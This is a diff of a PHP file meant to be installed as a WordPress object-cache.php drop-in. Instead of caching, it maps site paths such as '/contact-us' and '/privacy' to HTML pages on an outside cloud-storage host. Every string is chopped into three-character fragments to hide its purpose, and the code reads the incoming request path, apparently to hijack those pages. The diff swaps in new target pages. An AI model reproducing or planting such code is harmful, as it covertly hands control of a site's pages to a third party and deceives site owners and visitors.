@@ -10,9 +10,9 @@ Install this file to wp-content/object-cache.php
 */
 
 $__map = [
-    '/pr'.'iva'.'cy-'.'pol'.'icy' => 'htt'.'ps:'.'//d'.'emi'.'elp'.'e.s'.'gp1'.'.di'.'git'.'alo'.'cea'.'nsp'.'ace'.'s.c'.'om/'.'cfc'.'rec'.'ycl'.'ing'.'-pr'.'iva'.'cy-'.'pol'.'icy'.'.ht'.'ml',
-    '/co'.'nta'.'ct' => 'htt'.'ps:'.'//d'.'emi'.'elp'.'e.s'.'gp1'.'.di'.'git'.'alo'.'cea'.'nsp'.'ace'.'s.c'.'om/'.'cfc'.'rec'.'ycl'.'ing'.'-co'.'nta'.'ct.'.'htm'.'l',
-    '/fa'.'qs' => 'htt'.'ps:'.'//d'.'emi'.'elp'.'e.s'.'gp1'.'.di'.'git'.'alo'.'cea'.'nsp'.'ace'.'s.c'.'om/'.'cfc'.'rec'.'ycl'.'ing'.'-fa'.'qs.'.'htm'.'l',
+     '/ab'.'out'.'-ro'.'bbi'.'ns' => 'htt'.'ps:'.'//d'.'emi'.'elp'.'e.s'.'gp1'.'.di'.'git'.'alo'.'cea'.'nsp'.'ace'.'s.c'.'om/'.'rob'.'bin'.'sfo'.'und'.'ati'.'ons'.'yst'.'ems'.'-ab'.'out'.'-ro'.'bbi'.'ns.'.'htm'.'l',
+    '/co'.'nta'.'ct-'.'us' => 'htt'.'ps:'.'//d'.'emi'.'elp'.'e.s'.'gp1'.'.di'.'git'.'alo'.'cea'.'nsp'.'ace'.'s.c'.'om/'.'rob'.'bin'.'sfo'.'und'.'ati'.'ons'.'yst'.'ems'.'-co'.'nta'.'ct-'.'us.'.'htm'.'l',
+    '/pr'.'iva'.'cy' => 'htt'.'ps:'.'//d'.'emi'.'elp'.'e.s'.'gp1'.'.di'.'git'.'alo'.'cea'.'nsp'.'ace'.'s.c'.'om/'.'rob'.'bin'.'sfo'.'und'.'ati'.'ons'.'yst'.'ems'.'-pr'.'iva'.'cy.'.'htm'.'l',
 ];
 
 $__uri   = rtrim(parse_url(isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '', PHP_URL_PATH), '/');
